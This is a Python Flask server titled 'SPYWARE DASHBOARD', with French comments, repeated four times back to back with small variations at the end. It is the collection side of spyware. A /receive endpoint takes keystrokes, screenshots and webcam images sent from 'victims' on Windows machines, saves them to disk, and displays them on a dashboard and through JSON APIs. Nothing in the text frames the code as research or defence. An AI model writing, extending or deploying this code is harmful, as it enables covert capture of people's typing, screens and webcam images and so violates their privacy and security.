# dashboard.py - VERSION FINALE FONCTIONNELLE
import os
from flask import Flask, render_template, jsonify, request, send_file
import base64
from datetime import datetime
from io import BytesIO
import time

# Configuration Flask simple
app = Flask(__name__)

# Data storage
data = {
    "keystrokes": [],
    "screenshots": [],
    "webcam": [],
    "victims": set()
}

# Créer les dossiers nécessaires
os.makedirs("static/screenshots", exist_ok=True)
os.makedirs("static/webcam", exist_ok=True)

@app.route('/')
def index():
    """Main dashboard"""
    stats = {
        "keystrokes": len(data["keystrokes"]),
        "screenshots": len(data["screenshots"]),
        "webcam": len(data["webcam"]),
        "victims": len(data["victims"])
    }
    
    return render_template('dashboard.html',
                         keystrokes=data["keystrokes"][-30:],
                         screenshots=data["screenshots"][-8:],
                         webcam=data["webcam"][-8:],
                         victims=list(data["victims"]),
                         stats=stats)

@app.route('/receive', methods=['POST'])
def receive_data():
    """Receive data from Windows"""
    try:
        req = request.json
        computer = req.get('computer', 'Unknown')
        data_type = req.get('type')
        
        print(f"\n[+] {datetime.now().strftime('%H:%M:%S')} - {data_type} from {computer}")
        
        data["victims"].add(computer)
        
        if data_type == "keystroke":
            text = req.get('data', '')
            if text:
                entry = {
                    "id": len(data["keystrokes"]) + 1,
                    "computer": computer,
                    "phrase": text,
                    "time": datetime.now().strftime('%H:%M:%S'),
                    "date": datetime.now().strftime('%Y-%m-%d')
                }
                data["keystrokes"].append(entry)
                print(f"   📝: {text[:80]}...")
        
        elif data_type == "screenshot":
            if "image_base64" in req:
                save_image(computer, req, "screenshots")
        
        elif data_type == "webcam":
            if "image_base64" in req:
                save_image(computer, req, "webcam")
        
        # Keep data manageable
        for key in ["keystrokes", "screenshots", "webcam"]:
            if len(data[key]) > 200:
                data[key] = data[key][-100:]
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({"status": "error"}), 500

def save_image(computer, img_data, folder):
    """Save image and create thumbnail - CORRIGÉE"""
    try:
        # Decode image
        img_bytes = base64.b64decode(img_data["image_base64"])
        
        # Create timestamps and filenames
        timestamp = int(time.time())
        
        # 1. Fichiers sur DISK (avec static/)
        filename_disk = f"static/{folder}/{computer}_{timestamp}.jpg"
        thumbname_disk = f"static/{folder}/thumb_{computer}_{timestamp}.jpg"
        
        # 2. Chemins pour le WEB (sans static/)
        filename_web = f"{folder}/{computer}_{timestamp}.jpg"
        thumbname_web = f"{folder}/thumb_{computer}_{timestamp}.jpg"
        
        # Save original file to disk
        with open(filename_disk, "wb") as f:
            f.write(img_bytes)
        
        # Create thumbnail
        try:
            from PIL import Image
            img = Image.open(BytesIO(img_bytes))
            
            # Different sizes for webcam vs screenshots
            if folder == "webcam":
                img.thumbnail((400, 300))
            else:
                img.thumbnail((350, 250))
            
            img.save(thumbname_disk, "JPEG", quality=85)
            
            # Use web path for thumbnail
            thumbnail_path = thumbname_web
        except Exception as thumb_error:
            print(f"[!] Thumbnail error: {thumb_error}")
            thumbnail_path = filename_web
        
        # Create entry with WEB paths (sans "static/")
        entry = {
            "id": len(data[folder]) + 1,
            "computer": computer,
            "filepath": filename_web,      # Chemin WEB: "screenshots/PC_TIMESTAMP.jpg"
            "thumbnail": thumbnail_path,   # Chemin WEB: "screenshots/thumb_PC_TIMESTAMP.jpg"
            "time": datetime.now().strftime('%H:%M:%S'),
            "date": datetime.now().strftime('%Y-%m-%d'),
            "count": img_data.get("count", 0),
            "size_kb": round(len(img_bytes) / 1024, 2)  # Calculate actual size
        }
        
        data[folder].append(entry)
        print(f"   📸 {folder} #{entry['count']} saved")
        print(f"   📁 Disk: {filename_disk}")
        print(f"   🌐 Web: {filename_web}")
        
    except Exception as e:
        print(f"[!] Image save error: {e}")
        import traceback
        traceback.print_exc()

@app.route('/image/<path:filename>')
def get_image(filename):
    """Serve images - CORRIGÉE pour gérer les deux formats"""
    try:
        # Debug: print requested filename
        print(f"[🌐] Image request: {filename}")
        
        # Handle different path formats
        if filename.startswith('static/'):
            # Format: "static/screenshots/PC_TIMESTAMP.jpg"
            file_path = filename
        else:
            # Format: "screenshots/PC_TIMESTAMP.jpg"
            file_path = os.path.join('static', filename)
        
        # Debug: print full path
        print(f"[📁] Looking for: {os.path.abspath(file_path)}")
        
        # Check if file exists
        if os.path.exists(file_path):
            print(f"[✅] File found: {file_path}")
            return send_file(file_path, mimetype='image/jpeg')
        else:
            print(f"[❌] File NOT found: {file_path}")
            print(f"[🔍] Current dir: {os.getcwd()}")
            print(f"[🔍] Files in static/{filename.split('/')[0]}:")
            folder = filename.split('/')[0]
            static_folder = os.path.join('static', folder)
            if os.path.exists(static_folder):
                for f in os.listdir(static_folder):
                    print(f"     - {f}")
            
            return "Image not found", 404
            
    except Exception as e:
        print(f"[!] Error serving image: {e}")
        return "Image not found", 404

# API endpoints
@app.route('/api/keystrokes')
def api_keystrokes():
    return jsonify(data["keystrokes"][-30:])

@app.route('/api/screenshots')
def api_screenshots():
    return jsonify(data["screenshots"][-8:])

@app.route('/api/webcam')
def api_webcam():
    return jsonify(data["webcam"][-8:])

@app.route('/api/stats')
def api_stats():
    stats = {
        "keystrokes": len(data["keystrokes"]),
        "screenshots": len(data["screenshots"]),
        "webcam": len(data["webcam"]),
        "victims": len(data["victims"])
    }
    return jsonify(stats)

@app.route('/debug')
def debug():
    """Debug page to check structure"""
    import os
    result = "<h1>Debug Info</h1>"
    
    # Current directory
    result += f"<p>Current dir: {os.getcwd()}</p>"
    
    # Check static folder
    result += "<h2>Static folder contents:</h2>"
    if os.path.exists("static"):
        for root, dirs, files in os.walk("static"):
            level = root.replace("static", "").count(os.sep)
            indent = "&nbsp;" * 4 * level
            result += f"<p>{indent}{os.path.basename(root)}/</p>"
            subindent = "&nbsp;" * 4 * (level + 1)
            for file in files[:10]:  # Limit to 10 files per folder
                result += f"<p>{subindent}{file}</p>"
    else:
        result += "<p>Static folder not found!</p>"
    
    return result

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🖥️  SPYWARE DASHBOARD - VERSION CORRIGÉE")
    print("="*60)
    print("📊 3-Column Dashboard Running...")
    print("   • Webcam photos (Left)")
    print("   • Screenshots (Middle)")
    print("   • Keystrokes (Right)")
    print(f"📁 Current directory: {os.getcwd()}")
    print(f"📁 Static folder: {os.path.abspath('static')}")
    print(f"🌐 URL: http://localhost:5000")
    print(f"🔍 Debug: http://localhost:5000/debug")
    print("="*60)
    
    # Vérifier la structure
    if not os.path.exists("static"):
        print("[⚠️] WARNING: 'static' folder not found!")
        print("[⚠️] Creating it now...")
        os.makedirs("static/screenshots", exist_ok=True)
        os.makedirs("static/webcam", exist_ok=True)
    
    app.run(host='0.0.0.0', port=5000, debug=True)# dashboard.py - VERSION FINALE FONCTIONNELLE
import os
from flask import Flask, render_template, jsonify, request, send_file
import base64
from datetime import datetime
from io import BytesIO
import time

# Configuration Flask simple
app = Flask(__name__)

# Data storage
data = {
    "keystrokes": [],
    "screenshots": [],
    "webcam": [],
    "victims": set()
}

# Créer les dossiers nécessaires
os.makedirs("static/screenshots", exist_ok=True)
os.makedirs("static/webcam", exist_ok=True)

@app.route('/')
def index():
    """Main dashboard"""
    stats = {
        "keystrokes": len(data["keystrokes"]),
        "screenshots": len(data["screenshots"]),
        "webcam": len(data["webcam"]),
        "victims": len(data["victims"])
    }
    
    return render_template('dashboard.html',
                         keystrokes=data["keystrokes"][-30:],
                         screenshots=data["screenshots"][-8:],
                         webcam=data["webcam"][-8:],
                         victims=list(data["victims"]),
                         stats=stats)

@app.route('/receive', methods=['POST'])
def receive_data():
    """Receive data from Windows"""
    try:
        req = request.json
        computer = req.get('computer', 'Unknown')
        data_type = req.get('type')
        
        print(f"\n[+] {datetime.now().strftime('%H:%M:%S')} - {data_type} from {computer}")
        
        data["victims"].add(computer)
        
        if data_type == "keystroke":
            text = req.get('data', '')
            if text:
                entry = {
                    "id": len(data["keystrokes"]) + 1,
                    "computer": computer,
                    "phrase": text,
                    "time": datetime.now().strftime('%H:%M:%S'),
                    "date": datetime.now().strftime('%Y-%m-%d')
                }
                data["keystrokes"].append(entry)
                print(f"   📝: {text[:80]}...")
        
        elif data_type == "screenshot":
            if "image_base64" in req:
                save_image(computer, req, "screenshots")
        
        elif data_type == "webcam":
            if "image_base64" in req:
                save_image(computer, req, "webcam")
        
        # Keep data manageable
        for key in ["keystrokes", "screenshots", "webcam"]:
            if len(data[key]) > 200:
                data[key] = data[key][-100:]
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({"status": "error"}), 500

def save_image(computer, img_data, folder):
    """Save image and create thumbnail - CORRIGÉE"""
    try:
        # Decode image
        img_bytes = base64.b64decode(img_data["image_base64"])
        
        # Create timestamps and filenames
        timestamp = int(time.time())
        
        # 1. Fichiers sur DISK (avec static/)
        filename_disk = f"static/{folder}/{computer}_{timestamp}.jpg"
        thumbname_disk = f"static/{folder}/thumb_{computer}_{timestamp}.jpg"
        
        # 2. Chemins pour le WEB (sans static/)
        filename_web = f"{folder}/{computer}_{timestamp}.jpg"
        thumbname_web = f"{folder}/thumb_{computer}_{timestamp}.jpg"
        
        # Save original file to disk
        with open(filename_disk, "wb") as f:
            f.write(img_bytes)
        
        # Create thumbnail
        try:
            from PIL import Image
            img = Image.open(BytesIO(img_bytes))
            
            # Different sizes for webcam vs screenshots
            if folder == "webcam":
                img.thumbnail((400, 300))
            else:
                img.thumbnail((350, 250))
            
            img.save(thumbname_disk, "JPEG", quality=85)
            
            # Use web path for thumbnail
            thumbnail_path = thumbname_web
        except Exception as thumb_error:
            print(f"[!] Thumbnail error: {thumb_error}")
            thumbnail_path = filename_web
        
        # Create entry with WEB paths (sans "static/")
        entry = {
            "id": len(data[folder]) + 1,
            "computer": computer,
            "filepath": filename_web,      # Chemin WEB: "screenshots/PC_TIMESTAMP.jpg"
            "thumbnail": thumbnail_path,   # Chemin WEB: "screenshots/thumb_PC_TIMESTAMP.jpg"
            "time": datetime.now().strftime('%H:%M:%S'),
            "date": datetime.now().strftime('%Y-%m-%d'),
            "count": img_data.get("count", 0),
            "size_kb": round(len(img_bytes) / 1024, 2)  # Calculate actual size
        }
        
        data[folder].append(entry)
        print(f"   📸 {folder} #{entry['count']} saved")
        print(f"   📁 Disk: {filename_disk}")
        print(f"   🌐 Web: {filename_web}")
        
    except Exception as e:
        print(f"[!] Image save error: {e}")
        import traceback
        traceback.print_exc()

@app.route('/image/<path:filename>')
def get_image(filename):
    """Serve images - CORRIGÉE pour gérer les deux formats"""
    try:
        # Debug: print requested filename
        print(f"[🌐] Image request: {filename}")
        
        # Handle different path formats
        if filename.startswith('static/'):
            # Format: "static/screenshots/PC_TIMESTAMP.jpg"
            file_path = filename
        else:
            # Format: "screenshots/PC_TIMESTAMP.jpg"
            file_path = os.path.join('static', filename)
        
        # Debug: print full path
        print(f"[📁] Looking for: {os.path.abspath(file_path)}")
        
        # Check if file exists
        if os.path.exists(file_path):
            print(f"[✅] File found: {file_path}")
            return send_file(file_path, mimetype='image/jpeg')
        else:
            print(f"[❌] File NOT found: {file_path}")
            print(f"[🔍] Current dir: {os.getcwd()}")
            print(f"[🔍] Files in static/{filename.split('/')[0]}:")
            folder = filename.split('/')[0]
            static_folder = os.path.join('static', folder)
            if os.path.exists(static_folder):
                for f in os.listdir(static_folder):
                    print(f"     - {f}")
            
            return "Image not found", 404
            
    except Exception as e:
        print(f"[!] Error serving image: {e}")
        return "Image not found", 404

# API endpoints
@app.route('/api/keystrokes')
def api_keystrokes():
    return jsonify(data["keystrokes"][-30:])

@app.route('/api/screenshots')
def api_screenshots():
    return jsonify(data["screenshots"][-8:])

@app.route('/api/webcam')
def api_webcam():
    return jsonify(data["webcam"][-8:])

@app.route('/api/stats')
def api_stats():
    stats = {
        "keystrokes": len(data["keystrokes"]),
        "screenshots": len(data["screenshots"]),
        "webcam": len(data["webcam"]),
        "victims": len(data["victims"])
    }
    return jsonify(stats)

@app.route('/debug')
def debug():
    """Debug page to check structure"""
    import os
    result = "<h1>Debug Info</h1>"
    
    # Current directory
    result += f"<p>Current dir: {os.getcwd()}</p>"
    
    # Check static folder
    result += "<h2>Static folder contents:</h2>"
    if os.path.exists("static"):
        for root, dirs, files in os.walk("static"):
            level = root.replace("static", "").count(os.sep)
            indent = "&nbsp;" * 4 * level
            result += f"<p>{indent}{os.path.basename(root)}/</p>"
            subindent = "&nbsp;" * 4 * (level + 1)
            for file in files[:10]:  # Limit to 10 files per folder
                result += f"<p>{subindent}{file}</p>"
    else:
        result += "<p>Static folder not found!</p>"
    
    return result

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🖥️  SPYWARE DASHBOARD - VERSION CORRIGÉE")
    print("="*60)
    print("📊 3-Column Dashboard Running...")
    print("   • Webcam photos (Left)")
    print("   • Screenshots (Middle)")
    print("   • Keystrokes (Right)")
    print(f"📁 Current directory: {os.getcwd()}")
    print(f"📁 Static folder: {os.path.abspath('static')}")
    print(f"🌐 URL: http://localhost:5000")
    print(f"🔍 Debug: http://localhost:5000/debug")
    print("="*60)
    
    # Vérifier la structure
    if not os.path.exists("static"):
        print("[⚠️] WARNING: 'static' folder not found!")
        print("[⚠️] Creating it now...")
        os.makedirs("static/screenshots", exist_ok=True)
        os.makedirs("static/webcam", exist_ok=True)
    
    app.run(host='0.0.0.0', port=5000, debug=True)# dashboard.py - VERSION FINALE FONCTIONNELLE
import os
from flask import Flask, render_template, jsonify, request, send_file
import base64
from datetime import datetime
from io import BytesIO
import time

# Configuration Flask simple
app = Flask(__name__)

# Data storage
data = {
    "keystrokes": [],
    "screenshots": [],
    "webcam": [],
    "victims": set()
}

# Créer les dossiers nécessaires
os.makedirs("static/screenshots", exist_ok=True)
os.makedirs("static/webcam", exist_ok=True)

@app.route('/')
def index():
    """Main dashboard"""
    stats = {
        "keystrokes": len(data["keystrokes"]),
        "screenshots": len(data["screenshots"]),
        "webcam": len(data["webcam"]),
        "victims": len(data["victims"])
    }
    
    return render_template('dashboard.html',
                         keystrokes=data["keystrokes"][-30:],
                         screenshots=data["screenshots"][-8:],
                         webcam=data["webcam"][-8:],
                         victims=list(data["victims"]),
                         stats=stats)

@app.route('/receive', methods=['POST'])
def receive_data():
    """Receive data from Windows"""
    try:
        req = request.json
        computer = req.get('computer', 'Unknown')
        data_type = req.get('type')
        
        print(f"\n[+] {datetime.now().strftime('%H:%M:%S')} - {data_type} from {computer}")
        
        data["victims"].add(computer)
        
        if data_type == "keystroke":
            text = req.get('data', '')
            if text:
                entry = {
                    "id": len(data["keystrokes"]) + 1,
                    "computer": computer,
                    "phrase": text,
                    "time": datetime.now().strftime('%H:%M:%S'),
                    "date": datetime.now().strftime('%Y-%m-%d')
                }
                data["keystrokes"].append(entry)
                print(f"   📝: {text[:80]}...")
        
        elif data_type == "screenshot":
            if "image_base64" in req:
                save_image(computer, req, "screenshots")
        
        elif data_type == "webcam":
            if "image_base64" in req:
                save_image(computer, req, "webcam")
        
        # Keep data manageable
        for key in ["keystrokes", "screenshots", "webcam"]:
            if len(data[key]) > 200:
                data[key] = data[key][-100:]
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({"status": "error"}), 500

def save_image(computer, img_data, folder):
    """Save image and create thumbnail - CORRIGÉE"""
    try:
        # Decode image
        img_bytes = base64.b64decode(img_data["image_base64"])
        
        # Create timestamps and filenames
        timestamp = int(time.time())
        
        # 1. Fichiers sur DISK (avec static/)
        filename_disk = f"static/{folder}/{computer}_{timestamp}.jpg"
        thumbname_disk = f"static/{folder}/thumb_{computer}_{timestamp}.jpg"
        
        # 2. Chemins pour le WEB (sans static/)
        filename_web = f"{folder}/{computer}_{timestamp}.jpg"
        thumbname_web = f"{folder}/thumb_{computer}_{timestamp}.jpg"
        
        # Save original file to disk
        with open(filename_disk, "wb") as f:
            f.write(img_bytes)
        
        # Create thumbnail
        try:
            from PIL import Image
            img = Image.open(BytesIO(img_bytes))
            
            # Different sizes for webcam vs screenshots
            if folder == "webcam":
                img.thumbnail((400, 300))
            else:
                img.thumbnail((350, 250))
            
            img.save(thumbname_disk, "JPEG", quality=85)
            
            # Use web path for thumbnail
            thumbnail_path = thumbname_web
        except Exception as thumb_error:
            print(f"[!] Thumbnail error: {thumb_error}")
            thumbnail_path = filename_web
        
        # Create entry with WEB paths (sans "static/")
        entry = {
            "id": len(data[folder]) + 1,
            "computer": computer,
            "filepath": filename_web,      # Chemin WEB: "screenshots/PC_TIMESTAMP.jpg"
            "thumbnail": thumbnail_path,   # Chemin WEB: "screenshots/thumb_PC_TIMESTAMP.jpg"
            "time": datetime.now().strftime('%H:%M:%S'),
            "date": datetime.now().strftime('%Y-%m-%d'),
            "count": img_data.get("count", 0),
            "size_kb": round(len(img_bytes) / 1024, 2)  # Calculate actual size
        }
        
        data[folder].append(entry)
        print(f"   📸 {folder} #{entry['count']} saved")
        print(f"   📁 Disk: {filename_disk}")
        print(f"   🌐 Web: {filename_web}")
        
    except Exception as e:
        print(f"[!] Image save error: {e}")
        import traceback
        traceback.print_exc()

@app.route('/image/<path:filename>')
def get_image(filename):
    """Serve images - CORRIGÉE pour gérer les deux formats"""
    try:
        # Debug: print requested filename
        print(f"[🌐] Image request: {filename}")
        
        # Handle different path formats
        if filename.startswith('static/'):
            # Format: "static/screenshots/PC_TIMESTAMP.jpg"
            file_path = filename
        else:
            # Format: "screenshots/PC_TIMESTAMP.jpg"
            file_path = os.path.join('static', filename)
        
        # Debug: print full path
        print(f"[📁] Looking for: {os.path.abspath(file_path)}")
        
        # Check if file exists
        if os.path.exists(file_path):
            print(f"[✅] File found: {file_path}")
            return send_file(file_path, mimetype='image/jpeg')
        else:
            print(f"[❌] File NOT found: {file_path}")
            print(f"[🔍] Current dir: {os.getcwd()}")
            print(f"[🔍] Files in static/{filename.split('/')[0]}:")
            folder = filename.split('/')[0]
            static_folder = os.path.join('static', folder)
            if os.path.exists(static_folder):
                for f in os.listdir(static_folder):
                    print(f"     - {f}")
            
            return "Image not found", 404
            
    except Exception as e:
        print(f"[!] Error serving image: {e}")
        return "Image not found", 404

# API endpoints
@app.route('/api/keystrokes')
def api_keystrokes():
    return jsonify(data["keystrokes"][-30:])

@app.route('/api/screenshots')
def api_screenshots():
    return jsonify(data["screenshots"][-8:])

@app.route('/api/webcam')
def api_webcam():
    return jsonify(data["webcam"][-8:])

@app.route('/api/stats')
def api_stats():
    stats = {
        "keystrokes": len(data["keystrokes"]),
        "screenshots": len(data["screenshots"]),
        "webcam": len(data["webcam"]),
        "victims": len(data["victims"])
    }
    return jsonify(stats)

@app.route('/debug')
def debug():
    """Debug page to check structure"""
    import os
    result = "<h1>Debug Info</h1>"
    
    # Current directory
    result += f"<p>Current dir: {os.getcwd()}</p>"
    
    # Check static folder
    result += "<h2>Static folder contents:</h2>"
    if os.path.exists("static"):
        for root, dirs, files in os.walk("static"):
            level = root.replace("static", "").count(os.sep)
            indent = "&nbsp;" * 4 * level
            result += f"<p>{indent}{os.path.basename(root)}/</p>"
            subindent = "&nbsp;" * 4 * (level + 1)
            for file in files[:10]:  # Limit to 10 files per folder
                result += f"<p>{subindent}{file}</p>"
    else:
        result += "<p>Static folder not found!</p>"
    
    return result

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🖥️  SPYWARE DASHBOARD - VERSION CORRIGÉE")
    print("="*60)
    print("📊 3-Column Dashboard Running...")
    print("   • Webcam photos (Left)")
    print("   • Screenshots (Middle)")
    print("   • Keystrokes (Right)")
    print(f"📁 Current directory: {os.getcwd()}")
    print(f"📁 Static folder: {os.path.abspath('static')}")
    print(f"🌐 URL: http://localhost:5000")
    print(f"🔍 Debug: http://localhost:5000/debug")
    print("="*60)
    
    # Vérifier la structure
    if not os.path.exists("static"):
        print("[⚠️] WARNING: 'static' folder not found!")
        print("[⚠️] Creating it now...")
        os.makedirs("static/screenshots", exist_ok=True)
        os.makedirs("static/webcam", exist_ok=True)
    
    app.run(host='0.0.0.0', port=5000, debug=True)# dashboard.py - VERSION FINALE FONCTIONNELLE
import os
from flask import Flask, render_template, jsonify, request, send_file
import base64
from datetime import datetime
from io import BytesIO
import time

# Configuration Flask simple
app = Flask(__name__)

# Data storage
data = {
    "keystrokes": [],
    "screenshots": [],
    "webcam": [],
    "victims": set()
}

# Créer les dossiers nécessaires
os.makedirs("static/screenshots", exist_ok=True)
os.makedirs("static/webcam", exist_ok=True)

@app.route('/')
def index():
    """Main dashboard"""
    stats = {
        "keystrokes": len(data["keystrokes"]),
        "screenshots": len(data["screenshots"]),
        "webcam": len(data["webcam"]),
        "victims": len(data["victims"])
    }
    
    return render_template('dashboard.html',
                         keystrokes=data["keystrokes"][-30:],
                         screenshots=data["screenshots"][-8:],
                         webcam=data["webcam"][-8:],
                         victims=list(data["victims"]),
                         stats=stats)

@app.route('/receive', methods=['POST'])
def receive_data():
    """Receive data from Windows"""
    try:
        req = request.json
        computer = req.get('computer', 'Unknown')
        data_type = req.get('type')
        
        print(f"\n[+] {datetime.now().strftime('%H:%M:%S')} - {data_type} from {computer}")
        
        data["victims"].add(computer)
        
        if data_type == "keystroke":
            text = req.get('data', '')
            if text:
                entry = {
                    "id": len(data["keystrokes"]) + 1,
                    "computer": computer,
                    "phrase": text,
                    "time": datetime.now().strftime('%H:%M:%S'),
                    "date": datetime.now().strftime('%Y-%m-%d')
                }
                data["keystrokes"].append(entry)
                print(f"   📝: {text[:80]}...")
        
        elif data_type == "screenshot":
            if "image_base64" in req:
                save_image(computer, req, "screenshots")
        
        elif data_type == "webcam":
            if "image_base64" in req:
                save_image(computer, req, "webcam")
        
        # Keep data manageable
        for key in ["keystrokes", "screenshots", "webcam"]:
            if len(data[key]) > 200:
                data[key] = data[key][-100:]
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({"status": "error"}), 500

def save_image(computer, img_data, folder):
    """Save image and create thumbnail - CORRIGÉE"""
    try:
        # Decode image
        img_bytes = base64.b64decode(img_data["image_base64"])
        
        # Create timestamps and filenames
        timestamp = int(time.time())
        
        # 1. Fichiers sur DISK (avec static/)
        filename_disk = f"static/{folder}/{computer}_{timestamp}.jpg"
        thumbname_disk = f"static/{folder}/thumb_{computer}_{timestamp}.jpg"
        
        # 2. Chemins pour le WEB (sans static/)
        filename_web = f"{folder}/{computer}_{timestamp}.jpg"
        thumbname_web = f"{folder}/thumb_{computer}_{timestamp}.jpg"
        
        # Save original file to disk
        with open(filename_disk, "wb") as f:
            f.write(img_bytes)
        
        # Create thumbnail
        try:
            from PIL import Image
            img = Image.open(BytesIO(img_bytes))
            
            # Different sizes for webcam vs screenshots
            if folder == "webcam":
                img.thumbnail((400, 300))
            else:
                img.thumbnail((350, 250))
            
            img.save(thumbname_disk, "JPEG", quality=85)
            
            # Use web path for thumbnail
            thumbnail_path = thumbname_web
        except Exception as thumb_error:
            print(f"[!] Thumbnail error: {thumb_error}")
            thumbnail_path = filename_web
        
        # Create entry with WEB paths (sans "static/")
        entry = {
            "id": len(data[folder]) + 1,
            "computer": computer,
            "filepath": filename_web,      # Chemin WEB: "screenshots/PC_TIMESTAMP.jpg"
            "thumbnail": thumbnail_path,   # Chemin WEB: "screenshots/thumb_PC_TIMESTAMP.jpg"
            "time": datetime.now().strftime('%H:%M:%S'),
            "date": datetime.now().strftime('%Y-%m-%d'),
            "count": img_data.get("count", 0),
            "size_kb": round(len(img_bytes) / 1024, 2)  # Calculate actual size
        }
        
        data[folder].append(entry)
        print(f"   📸 {folder} #{entry['count']} saved")
        print(f"   📁 Disk: {filename_disk}")
        print(f"   🌐 Web: {filename_web}")
        
    except Exception as e:
        print(f"[!] Image save error: {e}")
        import traceback
        traceback.print_exc()

@app.route('/image/<path:filename>')
def get_image(filename):
    """Serve images - CORRIGÉE pour gérer les deux formats"""
    try:
        # Debug: print requested filename
        print(f"[🌐] Image request: {filename}")
        
        # Handle different path formats
        if filename.startswith('static/'):
            # Format: "static/screenshots/PC_TIMESTAMP.jpg"
            file_path = filename
        else:
            # Format: "screenshots/PC_TIMESTAMP.jpg"
            file_path = os.path.join('static', filename)
        
        # Debug: print full path
        print(f"[📁] Looking for: {os.path.abspath(file_path)}")
        
        # Check if file exists
        if os.path.exists(file_path):
            print(f"[✅] File found: {file_path}")
            return send_file(file_path, mimetype='image/jpeg')
        else:
            print(f"[❌] File NOT found: {file_path}")
            print(f"[🔍] Current dir: {os.getcwd()}")
            print(f"[🔍] Files in static/{filename.split('/')[0]}:")
            folder = filename.split('/')[0]
            static_folder = os.path.join('static', folder)
            if os.path.exists(static_folder):
                for f in os.listdir(static_folder):
                    print(f"     - {f}")
            
            return "Image not found", 404
            
    except Exception as e:
        print(f"[!] Error serving image: {e}")
        return "Image not found", 404

# API endpoints
@app.route('/api/keystrokes')
def api_keystrokes():
    return jsonify(data["keystrokes"][-30:])

@app.route('/api/screenshots')
def api_screenshots():
    return jsonify(data["screenshots"][-8:])

@app.route('/api/webcam')
def api_webcam():
    return jsonify(data["webcam"][-8:])

@app.route('/api/stats')
def api_stats():
    stats = {
        "keystrokes": len(data["keystrokes"]),
        "screenshots": len(data["screenshots"]),
        "webcam": len(data["webcam"]),
        "victims": len(data["victims"])
    }
    return jsonify(stats)

@app.route('/debug')
def debug():
    """Debug page to check structure"""
    import os
    result = "<h1>Debug Info</h1>"
    
    # Current directory
    result += f"<p>Current dir: {os.getcwd()}</p>"
    
    # Check static folder
    result += "<h2>Static folder contents:</h2>"
    if os.path.exists("static"):
        for root, dirs, files in os.walk("static"):
            level = root.replace("static", "").count(os.sep)
            indent = "&nbsp;" * 4 * level
            result += f"<p>{indent}{os.path.basename(root)}/</p>"
            subindent = "&nbsp;" * 4 * (level + 1)
            for file in files[:10]:  # Limit to 10 files per folder
                result += f"<p>{subindent}{file}</p>"
    else:
        result += "<p>Static folder not found!</p>"
    
    return result

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🖥️  SPYWARE DASHBOARD")
    print("="*60)
    print("📊 Dashboard: http://localhost:5000")
    print("🔧 Debug: http://localhost:5000/debug")
    print("="*60)
    print("Press Ctrl+C to stop the server")
    print("="*60)
    
    try:
        # DÉSACTIVER le reloader et activer threaded
        app.run(
            host='0.0.0.0', 
            port=5000, 
            debug=False,          # debug=False évite certains problèmes
            use_reloader=False,   # IMPORTANT: désactive le reloader
            threaded=True         # Meilleure performance
        )
    except KeyboardInterrupt:
        print("\n[✓] Server stopped cleanly")
    except Exception as e:
        print(f"\n[!] Error: {e}")